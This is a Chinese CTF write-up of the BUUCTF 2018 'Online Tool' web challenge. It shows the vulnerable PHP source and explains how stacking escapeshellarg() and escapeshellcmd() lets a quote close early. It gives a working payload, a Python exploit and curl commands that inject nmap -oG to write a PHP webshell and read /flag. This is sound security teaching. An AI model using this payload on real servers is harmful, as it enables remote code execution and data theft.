---
title: BUUCTF 2018 - Web - Online Tool
date: 2026-11-14 18:05:00
categories:
  - CTF
  - BUUCTF 2018
  - Web
tags:
  - escapeshellarg绕过
  - escapeshellcmd
  - nmap写马
  - RCE
cover: /img/cover/green-hair-letter-girl.jpg
description: 命令注入绕过题，host 先经 escapeshellarg 再经 escapeshellcmd 的组合可被引号与反斜杠连锁反应绕过，借 nmap -oG 把含 PHP 代码的扫描结果写入沙盒文件实现 getshell 读 flag。
keywords:
  - escapeshellarg
  - escapeshellcmd
  - nmap -oG
  - 一句话木马
  - BUUCTF
ai: >-
  本题是 BUUCTF 2018 的在线 nmap 扫描工具，host 先后经 escapeshellarg() 与 escapeshellcmd() 后拼进 system("nmap ...")。两者组合存在经典绕过：前者加单引号并转义已有单引号，后者再转义反斜杠与不成对单引号，导致中间反斜杠失效、后面单引号配成连接符，闭合被引号包裹的输入使后续内容成为可注入的 nmap 参数。利用时提交带引号的 host，配合 -oG 把含一句话木马的结果写入沙盒 a.php，再访问执行 cat /flag。沙盒名由 md5("glzjin" . REMOTE_ADDR) 决定，可从回显提取。
copyright_author: Hunter
---

> 结论先行：`escapeshellarg()` + `escapeshellcmd()` 组合可被绕过闭合单引号；用 `nmap -oG` 把含 `<?php ...?>` 的结果写进沙盒 `a.php`，访问木马读 `/flag`。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | BUUCTF 2018 |
| 方向 | Web |
| 难度 | 中等 |
| 环境 | 授权靶场（已脱敏） |

题目描述：一个在线 nmap 扫描工具，`host` 参数经 `escapeshellarg()` + `escapeshellcmd()` 过滤后执行 `system("nmap ...")`。

## 信息收集

### 源码

```php
<?php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin" . $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox ' . $sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F " . $host);
}
?>
```

## 漏洞分析

`escapeshellarg()` 先给字符串加单引号并转义已有单引号，`escapeshellcmd()` 再转义特殊字符（含 `\` 和不成对的 `'`）。

**两者组合存在经典绕过漏洞**（seebug：PHP escapeshellarg()+escapeshellcmd() 之殇）：

- 输入：`172.17.0.2' -v -d a=1`
- `escapeshellarg` 后：`'172.17.0.2'\'' -v -d a=1'`
- `escapeshellcmd` 后：`'172.17.0.2'\\'' -v -d a=1\'`
- 中间的 `\\` 被 shell 解释为 `\` 不再起转义作用，导致后面的 `'` 与再后面的 `'` 配成空白连接符，从而**闭合了单引号**，让后面的内容能注入为 nmap 参数。

## 利用过程

利用 nmap 的 `-oG` 参数把扫描结果（含我们注入的 PHP 代码）写到文件，实现写一句话木马：

```text
host=' <?php echo `cat /flag`;?> -oG a.php '
```

sandbox 目录 = `md5("glzjin" . REMOTE_ADDR)`，访问 `/沙盒/a.php` 执行木马读 flag。

注意：`REMOTE_ADDR` 会被 `X-Forwarded-For` 覆盖，沙盒目录名可从页面输出的 `you are in sandbox <md5>` 中提取。

## 完整 EXP

```python
import urllib.request, urllib.parse

base = 'http://target:8080'  # 授权靶场（已脱敏）
payload = "' <?php echo `cat /flag`;?> -oG a.php '"
url = base + '/?host=' + urllib.parse.quote(payload)
r = urllib.request.urlopen(url)
b = r.read().decode('utf-8', 'ignore')
i = b.find('sandbox ')
sandbox = b[i+8:i+40]   # 提取 32 位 md5 目录名
r2 = urllib.request.urlopen(base + '/' + sandbox + '/a.php')
print(r2.read().decode('utf-8', 'ignore'))
```

等价 curl（写马 payload 需 URL 编码）：

```bash
# 写木马
curl "http://target:8080/?host=%27%20%3C%3Fphp%20echo%20%60cat%20/flag%60%3B%3F%3E%20-oG%20a.php%20%27"

# 访问木马（<sandbox> 为页面回显的 32 位 md5）
curl "http://target:8080/<sandbox>/a.php"
```

## Flag

```text
flag{xxxx}
```

## 踩坑与总结

1. `escapeshellarg()` + `escapeshellcmd()` 组合使用可被绕过（转义单引号 + 反斜杠的连锁反应）。
2. nmap `-oG`（grepable output）可写文件，配合一句话木马实现 RCE。
3. sandbox 目录名由 `md5("glzjin" . REMOTE_ADDR)` 决定，可从页面输出中提取。
4. 两个「安全函数」叠加反而引入新缺陷，说明过滤链要整体审计，不能逐段认为安全。
